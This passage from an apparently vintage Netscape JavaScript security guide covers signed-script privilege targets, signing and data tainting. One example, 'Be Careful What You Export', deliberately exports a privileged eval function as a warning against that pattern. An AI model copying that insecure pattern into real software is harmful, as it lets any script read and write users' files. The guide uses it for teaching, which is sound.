+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1015259">UniversalBrowserRead</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1015261">
+Allows reading of privileged data from the browser. This allows the script to pass the same origin check for any document.</A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1015263">UniversalBrowserWrite</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1015265">
+Allows modification of privileged data in a browser. This allows the script to pass the same origin check for any document.</A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1015267">UniversalBrowserAccess</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1015269">
+Allows both reading and modification of privileged data from the browser. This allows the script to pass the same origin check for any document.</A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1015271">UniversalFileRead</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1015273">
+Allows a script to read any files stored on hard disks or other storage media connected to your computer.</A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1015275">UniversalPreferencesRead</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1015277">
+Allows the script to read preferences using the <CODE>navigator.preference</CODE> method.</A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1015279">UniversalPreferencesWrite</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1015281">
+Allows the script to set preferences using the <CODE>navigator.preference</CODE> method. </A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1015283">UniversalSendMail</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1015285">
+Allows the program to send mail in the user's name.</A></P>
+
+</TABLE>
+<TABLE>
+<TR><TD>
+</TABLE>
+</A></P>
+<A NAME="1015288">
+For a complete list of targets, see <A HREF="http://developer.netscape.com/docs/manuals/signedobj/targets/index.htm" TARGET="_top"><EM>Netscape System Targets</A></EM>.</A></P>
+
+<H4><A NAME="Head3;"></A>
+<A NAME="1015289">
+ JavaScript Features Requiring Privileges
+</A></H4>
+
+<A NAME="1015290">
+This section lists the JavaScript features that require expanded privileges and the target used to access each feature. Unsigned scripts cannot use any of these features, unless the end user has enabled codebase principals.</A></P>
+<ul><P><LI><A NAME="1015291">
+Setting a file upload widget requires <CODE>UniversalFileRead</CODE>.</A></LI>
+<P><LI><A NAME="1015292">
+Submitting a form to a <CODE>mailto:</CODE> or <CODE>news:</CODE> URL requires <CODE>UniversalSendMail</CODE>.</A></LI>
+<P><LI><A NAME="1015293">
+Using an <CODE>about:</CODE> URL other than <CODE>about:blank </CODE>requires<CODE> UniversalBrowserRead</CODE>.</A></LI>
+<P><LI><A NAME="1015294">
+<CODE>event</CODE> object: Setting any property requires <CODE>UniversalBrowserWrite</CODE>.</A></LI>
+<P><LI><A NAME="1015295">
+<CODE>DragDrop</CODE> event: Getting the value of the <CODE>data</CODE> property requires <CODE>UniversalBrowserRead</CODE>.</A></LI>
+<P><LI><A NAME="1015296">
+<CODE>history</CODE> object: Getting the value of any property requires <CODE>UniversalBrowserRead</CODE>.</A></LI>
+<P><LI><A NAME="1015297">
+<CODE>navigator</CODE> object:</A></LI>
+<ul>
+</P><LI><A NAME="1015298">
+Getting the value of a preference using the <CODE>preference</CODE> method requires <CODE>UniversalPreferencesRead</CODE>.</A></LI>
+</P><LI><A NAME="1015299">
+Setting the value of a preference using the <CODE>preference</CODE> method requires <CODE>UniversalPreferencesWrite</CODE>.</A></LI>
+</ul>
+<P><LI><A NAME="1015300">
+<CODE>window</CODE> object: Allow of the following operations require <CODE>UniversalBrowserWrite</CODE>.</A></LI>
+<ul>
+</P><LI><A NAME="1015301">
+Adding or removing the directory bar, location bar, menu bar, personal bar, scroll bar, status bar, or toolbar.</A></LI>
+</P><LI><A NAME="1015302">
+Using the methods in the following table under the indicated circumstances</A></LI>
+</ul>
+</ul><A NAME="1020364">
+<P><B></B>
+<TABLE BORDER="2" CELLPADDING=5>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1024599">enableExternalCapture</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1024601">
+To capture events in pages loaded from different servers. Follow this method with <CODE>captureEvents</CODE>.</A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1024603">close</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1024605">
+To unconditionally close a browser window.</A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1024607">moveBy</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1024609">
+To move a window off the screen.</A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1024611">moveTo</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1024613">
+To move a window off the screen.</A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1024615">open</A></PRE><TD VALIGN=baseline ALIGN=left><ul></P><LI><A NAME="1024617">
+To create a window smaller than 100 x 100 pixels or larger than the screen can accommodate by using<CODE> innerWidth</CODE>, <CODE>innerHeight</CODE>, <CODE>outerWidth</CODE>, and <CODE>outerHeight</CODE>.</A></P><LI><A NAME="1024618">
+To place a window off screen by using<CODE> screenX</CODE> and <CODE>screenY</CODE>.</A></P><LI><A NAME="1024619">
+To create a window without a titlebar by using<CODE> titlebar</CODE>.</A></P><LI><A NAME="1024620">
+To use <CODE>alwaysRaised</CODE>, <CODE>alwaysLowered</CODE>, or <CODE>z-lock</CODE> for any setting.</A></ul>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1024622">resizeTo</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1024624">
+To resize a window smaller than 100 x 100 pixels or larger than the screen can accommodate.</A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1024626">resizeBy</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1024628">
+To resize a window smaller than 100 x 100 pixels or larger than the screen can accommodate.</A></P>
+
+</TABLE>
+<TABLE>
+<TR><TD>
+</TABLE>
+</A></P>
+<ul><ul>
+</P><LI><A NAME="1020376">
+Setting the properties in the following table under the indicated circumstances:</A></LI>
+</ul>
+</ul><A NAME="1020386">
+<P><B></B>
+<TABLE BORDER="2" CELLPADDING=5>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1020379">innerWidth</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1020381">
+To set the inner width of a window to a size smaller than 100 x 100 or larger than the screen can accommodate.</A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1020383">innerHeight</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1020385">
+To set the inner height of a window to a size smaller than 100 x 100 or larger than the screen can accommodate.</A></P>
+
+</TABLE>
+<TABLE>
+<TR><TD>
+</TABLE>
+</A></P>
+
+<H4><A NAME="Head3;"></A>
+<A NAME="1020387">
+ Example
+</A></H4>
+
+<A NAME="1015346">
+The following script includes a button, that, when clicked, displays an alert dialog box containing part of the URL history of the browser. To work properly, the script must be signed.</A></P>
+<PRE><A NAME="1015347">&lt;SCRIPT ARCHIVE="myArchive.jar" ID="a"&gt;</A></PRE><PRE><A NAME="1015348">function getHistory(i) {<br>&nbsp;&nbsp;&nbsp;//Attempt to access privileged information <br>&nbsp;&nbsp;&nbsp;return history[i]; <br>}</A></PRE><PRE><A NAME="1015349">function getImmediateHistory() {<br>&nbsp;&nbsp;&nbsp;//Request privilege<br>&nbsp;&nbsp;&nbsp;netscape.security.PrivilegeManager.enablePrivilege(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"UniversalBrowserRead"); <br>&nbsp;&nbsp;&nbsp;return getHistory(1); <br>}</A></PRE><PRE><A NAME="1015350">&lt;/SCRIPT&gt; <br>...<br>&lt;INPUT TYPE="button" onClick="alert(getImmediateHistory());" ID="b"&gt;</A></PRE>
+<H3><A NAME="Head2;"></A>
+<A NAME="1015352">
+ Writing the Script
+</A></H3>
+
+<A NAME="1015353">
+This section describes special considerations for writing signed scripts. For more tips on writing your scripts, see the <EM><A HREF="http://developer.netscape.com/viewsource/index.html" TARGET="_top">View Source</A></EM> article, <EM><A HREF="http://developer.netscape.com/viewsource/goodman_sscripts.html" TARGET="_top">Applying Signed Scripts</EM></A>.</A></P>
+
+<H4><A NAME="Head3;"></A>
+<A NAME="1015364">
+ Capturing Events from Other Locations
+</A></H4>
+
+<A NAME="1015365">
+If a window with frames needs to capture events in pages loaded from different locations (servers), use the <CODE>enableExternalCapture</CODE> method in a signed script requesting <CODE>UniversalBrowserWrite</CODE> privileges. Use this method before calling the <CODE>captureEvents</CODE> method. For example, with the following code the window can capture all <CODE>Click</CODE> events that occur across its frames.</A></P>
+<PRE><A NAME="1015366">&lt;SCRIPT ARCHIVE="myArchive.jar" ID="archive"&gt;<br>...<br>function captureClicks() {<br>&nbsp;&nbsp;&nbsp;netscape.security.PrivilegeManager.enablePrivilege("UniversalBrowserWrite"); <br>&nbsp;&nbsp;&nbsp;enableExternalCapture();<br>&nbsp;&nbsp;&nbsp;captureEvents(Event.CLICK);<br>&nbsp;&nbsp;&nbsp;...<br>}<br>...<br>&lt;/SCRIPT&gt;</A></PRE>
+<H4><A NAME="Head3;"></A>
+<A NAME="1015368">
+ Isolating an Unsigned Layer within a Signed Container
+</A></H4>
+
+<A NAME="1015369">
+To create an unsigned layer within a signed container, you need to perform some additional steps to make scripts in the unsigned layer work properly.</A></P>
+<ul><P><LI><A NAME="1015370">
+You must set the <CODE>__parent__</CODE> property of the layer object to <CODE>null</CODE> so that variable lookups performed by the script in the unsigned layer do not follow the parent chain up to the <CODE>window</CODE> object and attempt to access the <CODE>window</CODE> object's properties, which are protected by the container check.</A></LI>
+<P><LI><A NAME="1015371">
+Because the standard objects (<CODE>String</CODE>, <CODE>Array</CODE>, <CODE>Date</CODE>, and so on) are defined in the <CODE>window</CODE> object and not normally in the layer, you must call the <CODE>initStandardObjects</CODE> method of the <CODE>layer</CODE> object. This creates copies of the standard objects in the layer's scope.</A></LI>
+</ul>
+<H4><A NAME="Head3;"></A>
+<A NAME="1015372">
+ International Characters in Signed Scripts
+</A></H4>
+
+<A NAME="1015373">
+When used in scripts, international characters can appear in string constants and in comments. JavaScript keywords and variables cannot include special international characters.</A></P>
+<A NAME="1015374">
+Scripts that include international characters cannot be signed because the process of transforming the characters to the local character set invalidates the signature. To work around this limitation:</A></P>
+<ul><P><LI><A NAME="1015375">
+Escape the international characters (<CODE>'0x\ea'</CODE>, and so on).</A></LI>
+<P><LI><A NAME="1015376">
+Put the data containing the international characters in a hidden form element, and access the form element through the signed script.</A></LI>
+<P><LI><A NAME="1015377">
+Separate signed and unsigned scripts into different layers, and use the international characters in the unsigned scripts.</A></LI>
+<P><LI><A NAME="1015378">
+Remove comments that include international characters.</A></LI>
+</ul><A NAME="1015379">
+There is no restriction on international characters in the HTML surrounding the signed scripts.</A></P>
+
+<H4><A NAME="Head3;"></A>
+<A NAME="1015381">
+ Importing and Exporting Functions
+</A></H4>
+
+<A NAME="1015382">
+You might want to provide interfaces to call into secure containers (windows and layers). To do so, you use the <CODE>import</CODE> and <CODE>export</CODE> statements. Exporting a function name makes it available to be imported by scripts outside the container without being subject to a container test.</A></P>
+<A NAME="1015383">
+You can import and export only functions--either top-level functions (associated with a <CODE>window</CODE> object) or methods of some other object. You cannot import or export entire objects or properties that are not functions.</A></P>
+<A NAME="1015384">
+Importing a function into your scope creates a new function of the same name as the imported function. Calling that function calls the corresponding function from the secure container.</A></P>
+<A NAME="1024252">
+To use <CODE>import</CODE> and <CODE>export</CODE>, you must explicitly set the <CODE>LANGUAGE</CODE> attribute of the <CODE>SCRIPT</CODE> tag to <CODE>"JavaScript1.2"</CODE>:</A></P>
+<PRE><A NAME="1024253">&lt;SCRIPT LANGUAGE="JavaScript1.2"&gt;</A></PRE><A NAME="1015386">
+In the signed script that defines a function you want to let other scripts access, use the <CODE>export</CODE> statement. The syntax of this statement is:</A></P>
+<PRE><A NAME="1015387"><I>exportStmt</I> ::= export <I>exprList<br>exprList</I> ::= <I>expr</I> | <I>expr</I>, <I>exprList</I></A></PRE><A NAME="1015388">
+where each <I>expr</I> must resolve to the name of a function. The <CODE>export</CODE> statement marks each function as importable.</A></P>
+<A NAME="1015389">
+In the script in which you want to import that function, use the <CODE>import</CODE> statement. The syntax of this statement is:</A></P>
+<PRE><A NAME="1015390"><I>importStmt</I> ::= import <I>importList<br>importList</I> ::= <I>importElem</I> | <I>importElem</I>, <I>importList<br>importElem</I> ::= <I>expr</I>.<I>funName</I> | <I>expr</I>.*</A></PRE><A NAME="1015391">
+Executing <CODE>import</CODE> <I>expr.funName</I> evaluates <I>expr</I> and then imports the <I>funName</I> function of that object into the current scope. It is an error if <I>expr</I> does not evaluate to an object, if there is no function named <I>funName</I>, or if the function exists but has not been marked as importable. Executing <CODE>import </CODE><I>expr</I><CODE>.*</CODE> imports all importable functions of <I>expr</I>.</A></P>
+<H5><A NAME="Head4;"></A>
+<A NAME="1015392">
+ Example
+</A></H5>
+
+<A NAME="1015393">
+The following example has three pages in a frameset. The file <CODE>containerAccess.html</CODE> defines the frameset and calls a user function when the frameset is loaded. One page, <CODE>secureContainer.html</CODE>, has signed scripts and exports a function. The other page, <CODE>access.html</CODE>, imports the exported function and calls it.</A></P>
+<A NAME="1015394">
+While this example exports a function that does not enable or require expanded privileges, you can export functions that do enable privileges. If you do so, you should be very careful to not inadvertently allow access to an attacker. For more information, see <A HREF="sec.htm#1015424">"Be Careful What You Export" on page&nbsp;234</A>.</A></P>
+<A NAME="1015398">
+The file <CODE>containerAccess.html</CODE> contains the following code:</A></P>
+<PRE><A NAME="1015399">&lt;HTML&gt;<br>&lt;FRAMESET NAME=myframes ROWS="50%,*" onLoad="inner.myOnLoad()"&gt;<br>&lt;FRAME NAME=inner SRC="access.html"&gt;<br>&lt;FRAME NAME=secureContainer SRC="secureContainer.html"&gt;<br>&lt;/FRAMESET&gt;<br>&lt;/HTML&gt;</A></PRE><A NAME="1015400">
+The file <CODE>secureContainer.html</CODE> contains the following code:</A></P>
+<PRE><A NAME="1015401">&lt;HTML&gt;<br>This page defines a variable and two functions. <br>Only one function, publicFunction, is exported.<br>&lt;BR&gt;</A></PRE><PRE><A NAME="1015402">&lt;SCRIPT ARCHIVE="secureContainer.jar" LANGUAGE="JavaScript1.2" ID="a"&gt;</A></PRE><PRE><A NAME="1015403">function privateFunction() {<br>&nbsp;&nbsp;&nbsp;return 7;<br>}</A></PRE><PRE><A NAME="1015404">var privateVariable = 23;</A></PRE><PRE><A NAME="1015405">function publicFunction() {<br>&nbsp;&nbsp;&nbsp;return 34;<br>}<br>export publicFunction;</A></PRE><PRE><A NAME="1015406">netscape.security.PrivilegeManager.enablePrivilege(<br>&nbsp;&nbsp;&nbsp;"UniversalBrowserRead");<br>document.write("This page is at " + history[0]);</A></PRE><PRE><A NAME="1015407">// Privileges revert automatically when the script terminates.<br>&lt;/SCRIPT&gt;<br>&lt;/HTML&gt;</A></PRE><A NAME="1015408">
+The file <CODE>access.html</CODE> contains the following code:</A></P>
+<PRE><A NAME="1015409">&lt;HTML&gt;<br>This page attempts to access an exported function from a signed<br>container. The access should succeed.</A></PRE><PRE><A NAME="1015410">&lt;SCRIPT LANGUAGE="JavaScript1.2"&gt;</A></PRE><PRE><A NAME="1015411">function myOnLoad() {<br>&nbsp;&nbsp;&nbsp;var ctnr = top.frames.secureContainer;<br>&nbsp;&nbsp;&nbsp;import ctnr.publicFunction;<br>&nbsp;&nbsp;&nbsp;alert("value is " + publicFunction());<br>}</A></PRE><PRE><A NAME="1015412">&lt;/SCRIPT&gt;<br>&lt;/HTML&gt;</A></PRE>
+<H4><A NAME="Head3;"></A>
+<A NAME="1015414">
+ Hints for Writing Secure JavaScript
+</A></H4>
+
+<H5><A NAME="Head4;"></A>
+<A NAME="1015415">
+ Check the Location of the Script
+</A></H5>
+
+<A NAME="1015416">
+If you have signed scripts in pages you have posted to your site, it is possible to copy the JAR file from your site and post it on another site. As long as the signed scripts themselves are not altered, the scripts will continue to operate under your signature. (See <A HREF="sec.htm#1015478">"Debugging Hash Errors" on page&nbsp;239</A> for one exception to this rule.)</A></P>
+<A NAME="1015420">
+If you want to prevent this, you can force your scripts to work only from your site.</A></P>
+<PRE><A NAME="1015421">&lt;SCRIPT ARCHIVE="siteSpecific.jar" ID="a" LANGUAGE="JavaScript1.2"&gt;<br>if (document.URL.match(/^http:\/\/www.company.com\//)) {<br>&nbsp;&nbsp;&nbsp;netscape.security.PrivilegeManager.enablePrivilege(...);<br>&nbsp;&nbsp;&nbsp;// Do your stuff<br>}<br>&lt;/SCRIPT&gt;</A></PRE><A NAME="1015422">
+Then, if the JAR file and script are copied to another site, they no longer work. If the person who copies the script alters it to bypass the check on the source of the script, the signature is invalidated.</A></P>
+<H5><A NAME="Head4;"></A>
+<A NAME="1015424">
+ Be Careful What You Export
+</A></H5>
+
+<A NAME="1015425">
+When you export functions from your signed script, you are in effect transferring any trust the user has placed in you to any script that calls your functions. This means you have a responsibility to ensure that you are not exporting interfaces that can be used in ways you do not want. For example, the following program exports a call to <CODE>eval</CODE> that can operate under expanded privileges.</A></P>
+<PRE><A NAME="1024170">&lt;SCRIPT ARCHIVE="duh.jar" ID="a"&gt;<br>function myEval(s) {<br>&nbsp;&nbsp;&nbsp;netscape.security.PrivilegeManager.enablePrivilege(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"UniversalFileAccess");<br>&nbsp;&nbsp;&nbsp;return eval(s);<br>}<br>export myEval; // Don't do this!!!!<br>&lt;/SCRIPT&gt;</A></PRE><A NAME="1024171">
+Now any other script can import <CODE>myEval</CODE> and read and write any file on the user's hard disk using trust the user has granted to you.</A></P>
+<H5><A NAME="Head4;"></A>
+<A NAME="1015428">
+ Minimize the Trusted Code Base
+</A></H5>
+
+<A NAME="1015429">
+In security parlance, the <EM>trusted code base</EM> (TCB) is the set of code that has privileges to perform restricted actions. One way to improve security is reduce the size of the TCB, which then gives fewer points for attack or opportunities for mistakes.</A></P>
+<A NAME="1015430">
+For example, the following code, if executed in a signed script with the user's approval, opens a new window containing the history of the browser:</A></P>
+<PRE><A NAME="1015431">&lt;SCRIPT ARCHIVE="historyWin.jar" ID="a"&gt;<br>netscape.security.PrivilegeManager.enablePrivilege(<br>&nbsp;&nbsp;&nbsp;"UniversalBrowserAccess");<br>var win = window.open();<br>for (var i=0; i &lt; history.length; i++) {<br>&nbsp;&nbsp;&nbsp;win.document.writeln(history[i] + "&lt;BR&gt;");<br>}<br>win.close();<br>&lt;/SCRIPT&gt;</A></PRE><A NAME="1015432">
+The TCB in this instance is the entire script because privileges are acquired at the beginning and never reverted. You could reduce the TCB by rewriting the program as follows:</A></P>
+<PRE><A NAME="1015433">&lt;SCRIPT ARCHIVE="historyWin.jar" ID="a"&gt;<br>var win = window.open();<br>netscape.security.PrivilegeManager.enablePrivilege(<br>&nbsp;&nbsp;&nbsp;"UniversalBrowserAccess");<br>for (var i=0; i &lt; history.length; i++) {<br>&nbsp;&nbsp;&nbsp;win.document.writeln(history[i] + "&lt;BR&gt;");<br>}<br>netscape.security.PrivilegeManager.revertPrivilege(<br>&nbsp;&nbsp;&nbsp;"UniversalBrowserAccess");<br>win.close();<br>&lt;/SCRIPT&gt;</A></PRE><A NAME="1015434">
+With this change, the TCB becomes only the loop containing the accesses to the <CODE>history</CODE> property. You could avoid the extra call into Java to revert the privilege by introducing a function:</A></P>
+<PRE><A NAME="1015435">&lt;SCRIPT ARCHIVE="historyWin.jar" ID="a"&gt;<br>function writeArray() {<br>&nbsp;&nbsp;&nbsp;netscape.security.PrivilegeManager.enablePrivilege(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"UniversalBrowserAccess");<br>&nbsp;&nbsp;&nbsp;for (var i=0; i &lt; history.length; i++) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;win.document.writeln(history[i] + "&lt;BR&gt;");<br>&nbsp;&nbsp;&nbsp;}<br>}<br>var win = window.open();<br>writeArray();<br>win.close();<br>&lt;/SCRIPT&gt;</A></PRE><A NAME="1015436">
+The privileges are automatically reverted when <CODE>writeArray</CODE> returns, so you do not have to do so explicitly.</A></P>
+<H5><A NAME="Head4;"></A>
+<A NAME="1015437">
+ Use the Minimal Capability Required for the Task
+</A></H5>
+
+<A NAME="1015438">
+Another way of reducing your exposure to exploits or mistakes is by using only the minimal capability required to perform the given access. For example, the previous code requested <CODE>UniversalBrowserAccess</CODE>, which is a macro target containing both <CODE>UniversalBrowserRead</CODE> and <CODE>UniversalBrowserWrite</CODE>. Only <CODE>UniversalBrowserRead</CODE> is required to read the elements of the <CODE>history</CODE> array, so you could rewrite the above code more securely:</A></P>
+<PRE><A NAME="1015439">&lt;SCRIPT ARCHIVE="historyWin.jar" ID="a"&gt;<br>function writeArray() {<br>&nbsp;&nbsp;&nbsp;netscape.security.PrivilegeManager.enablePrivilege(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"UniversalBrowserRead");<br>&nbsp;&nbsp;&nbsp;for (var i=0; i &lt; history.length; i++) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;win.document.writeln(history[i] + "&lt;BR&gt;");<br>&nbsp;&nbsp;&nbsp;}<br>}<br>var win = window.open();<br>writeArray();<br>win.close();<br>&lt;/SCRIPT&gt;</A></PRE>
+<H3><A NAME="Head2;"></A>
+<A NAME="1015441">
+ Signing Scripts
+</A></H3>
+
+<A NAME="1015442">
+During development of a script you will eventually sign, you can use codebase principals for testing, as described in <A HREF="sec.htm#1015135">"Codebase Principals" on page&nbsp;217</A>. Once you have finished modifying the script, you need to sign it.</A></P>
+<A NAME="1015446">
+For any script to be granted expanded privileges, all scripts on the same HTML page or layer must be signed. If you use layers, you can have both signed and unsigned scripts as long as you keep them in separate layers. For more information, see <A HREF="sec.htm#1015075">"Using Signed Scripts" on page&nbsp;215</A>.</A></P>
+<A NAME="1024359">
+You can sign JavaScript files (accessed with the <CODE>SRC</CODE> attribute of the <CODE>SCRIPT</CODE> tag), inline scripts, event handler scripts, and JavaScript entities. You cannot sign <CODE>javascript:</CODE> URLs. Before you sign the script, be sure you have properly identified it, as described in <A HREF="sec.htm#1015201">"Identifying Signed Scripts" on page&nbsp;222</A>.</A></P>
+
+<H4><A NAME="Head3;"></A>
+<A NAME="1024364">
+ Using the Netscape Signing Tool
+</A></H4>
+
+<A NAME="1024448">
+Once you have written a script, you sign it using the Netscape Signing Tool. See <EM><A HREF="http://developer.netscape.com/docs/manuals/signedobj/signtool/index.htm" TARGET="_top">Signing Software with Netscape Signing Tool 1.1</EM></A> for information.</A></P>
+
+<H4><A NAME="Head3;"></A>
+<A NAME="1024374">
+ After Signing
+</A></H4>
+
+<A NAME="1024375">
+Once you have signed a script, any time you change it you must re-sign it. For JavaScript files, this means you cannot change anything in the file. For inline scripts, you cannot change anything between the initial <CODE>&lt;SCRIPT ...&gt;</CODE> and the closing <CODE>&lt;/SCRIPT&gt;</CODE>. For event handlers and JavaScript entities, you cannot change anything at all in the tag that includes the handler or entity.</A></P>
+<A NAME="1015467">
+A change can be as simple as adding or removing whitespace in the script.</A></P>
+<A NAME="1015468">
+Changes to a signed script's byte stream invalidate the script's signature. This includes moving the HTML page between platforms that have different representations of text. For example, moving an HTML page from a Windows server to a UNIX server changes the byte stream and invalidates the signature. (This does not affect viewing pages from multiple platforms.) To avoid this, you can move the page in binary mode. Note that doing so changes the appearance of the page in your text editor but not in the browser.</A></P>
+<A NAME="1015469">
+Although you cannot make changes to the script, you can make changes to the surrounding information in the HTML file. You can even copy a signed script from one file to another, as long as you make sure you change nothing within the script.</A></P>
+
+<H3><A NAME="Head2;"></A>
+<A NAME="1015471">
+ Troubleshooting Signed Scripts
+</A></H3>
+
+
+<H4><A NAME="Head3;"></A>
+<A NAME="1015473">
+ Errors on the Java Console
+</A></H4>
+
+<A NAME="1015474">
+Be sure to check the Java console for errors if your signed scripts do not function as expected. You may see errors such as the following:</A></P>
+<PRE><A NAME="1015475"># Error: Invalid Hash of this JAR entry (-7882)<br># jar file: C:\Program Files\Netscape\Users\norris\cache\MVI9CF1F.JAR<br># path: 1</A></PRE><A NAME="1015476">
+The path value printed for signed JavaScript is either the value of the <CODE>ID</CODE> attribute or the <CODE>SRC</CODE> attribute of the tag that supplied the script.</A></P>
+
+<H4><A NAME="Head3;"></A>
+<A NAME="1015478">
+ Debugging Hash Errors
+</A></H4>
+
+<A NAME="1015479">
+Hash errors occur if the script has changed from when it was signed. The most common cause of this problem is that the scripts have been moved from one platform to another with a text transfer rather than a binary transfer. Because line separator characters can differ from platform to platform, the hash could change from when the script was originally signed.</A></P>
+<A NAME="1015480">
+One good way to debug this sort of problem is to use the <CODE>-s</CODE> option to <CODE>signPages</CODE>, which will save the inline scripts in the JAR file. You can then unpack the jar file when you get the hash errors and compare it to the HTML file to track down the source of the problems. For information on <CODE>signPages</CODE>, see <EM><A HREF="http://developer.netscape.com/docs/manuals/signedobj/signtool/index.htm" TARGET="_top">Signing Software with Netscape Signing Tool 1.1</EM></A>.</A></P>
+
+<H4><A NAME="Head3;"></A>
+<A NAME="1015483">
+ "User did not grant privilege" Exception or Unsigned Script Dialog Box
+</A></H4>
+
+<A NAME="1015484">
+Depending on whether or not you have enabled codebase principals, you see different behavior if a script attempts to enable privileges when it is not signed or when its principals have been downgraded due to mixing.</A></P>
+<A NAME="1015485">
+If you have not enabled codebase principals and a script attempts to enable privileges for an unsigned script, it gets an exception from Java that the "user did not grant privilege." If you did enable codebase principals, you will see a Java security dialog box that asking for permissions for the unsigned code.</A></P>
+<A NAME="1021261">
+This behavior is caused by either an error in verifying the certificate principals (which will cause an error to be printed to the Java console; see <A HREF="sec.htm#1015473">"Errors on the Java Console" on page&nbsp;238</A>), or by mixing signed and unsigned scripts. There are many possible sources of unsigned scripts. In particular, because there is no way to sign <CODE>javascript:</CODE> URLs or dynamically generated scripts, using them causes the downgrading of principals.</A></P>
+
+<HR><H2><A NAME="Using Data Tainting"></A>
+<A NAME="1021266">
+ Using Data Tainting
+</A></H2><A NAME="1021269">
+JavaScript&nbsp;1.1 has a feature called <I>data tainting</I> that retains the security restriction of the same origin policy but provides a means of secure access to specific components on a page. This feature is available only in JavaScript&nbsp;1.1; it was removed in JavaScript&nbsp;1.2.</A></P>
+<ul><P><LI><A NAME="1020916">
+When data tainting is enabled, JavaScript in one window can see properties of another window, no matter what server the other window's document was loaded from. However, the author of the other window <I>taints</I> (marks) property values or other data that should be secure or private, and JavaScript cannot pass these tainted values on to any server without the user's permission.</A></LI>
+<P><LI><A NAME="1020917">
+When data tainting is disabled, a script cannot access any properties of a window on another server.</A></LI>
+</ul><A NAME="1020918">
+To enable tainting, the end user sets an environment variable, as described in <A HREF="sec.htm#1020979">"Enabling Tainting" on page&nbsp;241</A>.</A></P>
+
+<H3><A NAME="Head2;"></A>
+<A NAME="1020923">
+ How Tainting Works
+</A></H3>
+
+<A NAME="1020924">
+A page's author is in charge of tainting elements. The following table lists properties and methods that are tainted by default.</A></P>
+<A NAME="1020971">
+<P><B><A NAME="1020928">
+Table 14.3&nbsp;Properties tainted by default</A></B>
+<TABLE BORDER="2" CELLPADDING=5>
+<TR><TH VALIGN=baseline ALIGN=left><B><A NAME="1020932">
+<B>Object
+</B></A><B><TH VALIGN=baseline ALIGN=left><B><A NAME="1020934">
+<B>Tainted properties
+</B></A><B>
+<TR><TD VALIGN=baseline ALIGN=left><P><A NAME="1020936">
+<CODE>document</CODE></A></P><TD VALIGN=baseline ALIGN=left><P><A NAME="1020938">
+<CODE>cookie</CODE>, <CODE>domain</CODE>, <CODE>forms</CODE>, <CODE>lastModified</CODE>, <CODE>links</CODE>, <CODE>referrer</CODE>, <CODE>title</CODE>, <CODE>URL</CODE></A></P>
+<TR><TD VALIGN=baseline ALIGN=left><P><A NAME="1020940">
+<CODE>Form</CODE></A></P><TD VALIGN=baseline ALIGN=left><P><A NAME="1020942">
+<CODE>action</CODE>, <CODE>name</CODE></A></P>
+<TR><TD VALIGN=baseline ALIGN=left><P><A NAME="1020944">
+any form input element</A></P><TD VALIGN=baseline ALIGN=left><P><A NAME="1020946">
+<CODE>checked</CODE>, <CODE>defaultChecked</CODE>, <CODE>defaultValue</CODE>, <CODE>name</CODE>, <CODE>selectedIndex</CODE>, <CODE>selected</CODE>, <CODE>toString</CODE>, <CODE>text</CODE>, <CODE>value</CODE></A></P>
+<TR><TD VALIGN=baseline ALIGN=left><P><A NAME="1020948">
+<CODE>history</CODE></A></P><TD VALIGN=baseline ALIGN=left><P><A NAME="1020950">
+<CODE>current</CODE>, <CODE>next</CODE>, <CODE>previous</CODE>, <CODE>toString</CODE></A></P>
+<TR><TD VALIGN=baseline ALIGN=left><P><A NAME="1020952">
+image</A></P><TD VALIGN=baseline ALIGN=left><P><A NAME="1020954">
+<CODE>name</CODE></A></P>
+<TR><TD VALIGN=baseline ALIGN=left><P><A NAME="1020956">
+<CODE>Option</CODE></A></P><TD VALIGN=baseline ALIGN=left><P><A NAME="1020958">
+<CODE>defaultSelected</CODE>, <CODE>selected</CODE>, <CODE>text</CODE>, <CODE>value</CODE></A></P>
+<TR><TD VALIGN=baseline ALIGN=left><P><A NAME="1020960">
+<CODE>location</CODE> and <CODE>Link</CODE></A></P><TD VALIGN=baseline ALIGN=left><P><A NAME="1020962">
